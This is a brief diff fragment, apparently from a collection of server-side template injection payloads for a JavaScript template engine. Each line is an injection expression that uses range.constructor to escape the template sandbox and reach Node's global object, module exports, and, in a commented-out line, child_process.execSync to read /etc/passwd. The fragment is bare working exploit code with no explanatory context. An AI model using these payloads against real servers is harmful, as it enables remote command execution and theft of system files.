@@ -15,7 +15,7 @@ ${{ range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
 
 
 22:
-${{ range.constructor("return module.exports")() | dump}}
+// range.constructor("return module.exports")() | dump }}
 
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
 
